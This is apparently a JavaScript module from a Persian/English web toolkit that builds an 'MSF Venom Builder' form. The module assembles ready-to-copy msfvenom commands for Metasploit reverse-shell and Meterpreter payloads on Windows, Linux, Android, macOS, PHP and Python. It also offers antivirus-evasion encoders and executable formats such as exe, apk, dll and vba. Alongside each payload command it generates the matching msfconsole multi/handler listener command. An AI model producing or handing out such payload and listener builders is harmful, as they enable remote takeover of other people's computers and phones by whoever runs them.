export default function render(lang) {
  const t = (fa, en) => lang === 'fa' ? fa : en;
  const payloads = [
    { value: 'linux/x64/meterpreter/reverse_tcp', label: 'Linux x64 Meterpreter Reverse TCP' },
    { value: 'windows/x64/meterpreter/reverse_tcp', label: 'Windows x64 Meterpreter Reverse TCP' },
    { value: 'linux/x86/meterpreter/reverse_tcp', label: 'Linux x86 Meterpreter Reverse TCP' },
    { value: 'windows/x86/meterpreter/reverse_tcp', label: 'Windows x86 Meterpreter Reverse TCP' },
    { value: 'linux/x64/shell/reverse_tcp', label: 'Linux x64 Shell Reverse TCP' },
    { value: 'windows/x64/shell/reverse_tcp', label: 'Windows x64 Shell Reverse TCP' },
    { value: 'linux/x86/shell_reverse_tcp', label: 'Linux x86 Shell Reverse TCP (stageless)' },
    { value: 'windows/x86/shell_reverse_tcp', label: 'Windows x86 Shell Reverse TCP (stageless)' },
    { value: 'android/meterpreter/reverse_tcp', label: 'Android Meterpreter Reverse TCP' },
    { value: 'osx/x64/meterpreter/reverse_tcp', label: 'macOS x64 Meterpreter Reverse TCP' },
    { value: 'php/meterpreter_reverse_tcp', label: 'PHP Meterpreter Reverse TCP' },
    { value: 'python/meterpreter/reverse_tcp', label: 'Python Meterpreter Reverse TCP' },
  ];
  const platforms = ['linux', 'windows', 'android', 'osx', 'php', 'python'];
  const formats = ['exe', 'elf', 'apk', 'py', 'php', 'asp', 'aspx', 'jsp', 'war', 'ps1', 'vba', 'raw', 'python', 'bash', 'macho', 'dll', 'msi'];
  const encoders = ['x86/shikata_ga_nai', 'x64/xor', 'x64/zutto_dekiru', 'x86/fnstenv_mov', 'x86/call4_dword_xor', '', 'none'];
  return `<div class="panel">
    <h3 class="section-title">${t('MSF Venom Builder', 'MSF Venom Builder')}</h3>
    <div class="stack">
      <div>
        <label class="label">${t('Payload', 'Payload')}</label>
        <select id="mv-payload" class="field">
          ${payloads.map(p => `<option value="${p.value}">${p.label}</option>`).join('')}
        </select>
      </div>
      <div class="grid two">
        <div>
          <label class="label">LHOST</label>
          <input id="mv-lhost" class="field" type="text" placeholder="192.168.1.100">
        </div>
        <div>
          <label class="label">LPORT</label>
          <input id="mv-lport" class="field" type="number" placeholder="4444">
        </div>
      </div>
      <div class="grid two">
        <div>
          <label class="label">${t('Encoder', 'Encoder')}</label>
          <select id="mv-encoder" class="field">
            ${encoders.map(e => `<option value="${e}"${e===''?'':''}>${e === '' ? (lang === 'fa' ? 'بدون' : 'None') : e === 'none' ? (lang === 'fa' ? 'بدون' : 'None') : e}</option>`).join('')}
          </select>
        </div>
        <div>
          <label class="label">${t('پلتفرم', 'Platform')}</label>
          <select id="mv-platform" class="field">
            ${platforms.map(p => `<option value="${p}">${p}</option>`).join('')}
          </select>
        </div>
      </div>
      <div class="grid two">
        <div>
          <label class="label">${t('معماری', 'Architecture')}</label>
          <select id="mv-arch" class="field">
            <option value="x64">x64</option>
            <option value="x86">x86</option>
          </select>
        </div>
        <div>
          <label class="label">${t('فرمت', 'Format')}</label>
          <select id="mv-format" class="field">
            ${formats.map(f => `<option value="${f}">${f}</option>`).join('')}
          </select>
        </div>
      </div>
      <div>
        <label class="label">${t('نام فایل خروجی', 'Output Filename')}</label>
        <input id="mv-out" class="field" type="text" placeholder="payload.exe">
      </div>
      <button class="primary-btn" onclick="mvGenerate()">${t('تولید', 'Generate')}</button>
      <div id="mv-result" style="display:none">
        <div class="section-title">msfvenom ${t('دستور', 'Command')}</div>
        <pre class="out" id="mv-cmd" style="cursor:pointer" onclick="mvCopy('mv-cmd')"></pre>
        <div class="section-title">${t('دستور Handler', 'Handler Command')}</div>
        <pre class="out" id="mv-handler" style="cursor:pointer" onclick="mvCopy('mv-handler')"></pre>
        <div class="button-row">
          <button class="secondary-btn" onclick="mvCopy('mv-cmd')">${t('کپی دستور', 'Copy Command')}</button>
          <button class="secondary-btn" onclick="mvCopy('mv-handler')">${t('کپی Handler', 'Copy Handler')}</button>
        </div>
      </div>
    </div>
  </div>`;
}

export function init() {
  window.mvGenerate = function() {
    const payload = document.getElementById('mv-payload').value;
    const lhost = document.getElementById('mv-lhost').value.trim();
    const lport = document.getElementById('mv-lport').value.trim();
    const encoder = document.getElementById('mv-encoder').value;
    const platform = document.getElementById('mv-platform').value;
    const arch = document.getElementById('mv-arch').value;
    const format = document.getElementById('mv-format').value;
    const out = document.getElementById('mv-out').value.trim() || 'payload.' + format;
    if (!lhost || !lport) return;
    let cmd = 'msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport;
    if (encoder && encoder !== 'none') cmd += ' -e ' + encoder;
    cmd += ' -a ' + arch + ' --platform ' + platform + ' -f ' + format + ' -o ' + out;
    document.getElementById('mv-cmd').textContent = cmd;
    const handlerCmd = 'msfconsole -q -x "use multi/handler; set PAYLOAD ' + payload + '; set LHOST ' + lhost + '; set LPORT ' + lport + '; exploit"';
    document.getElementById('mv-handler').textContent = handlerCmd;
    document.getElementById('mv-result').style.display = 'block';
  };
  window.mvCopy = function(id) {
    navigator.clipboard.writeText(document.getElementById(id).textContent);
  };
}
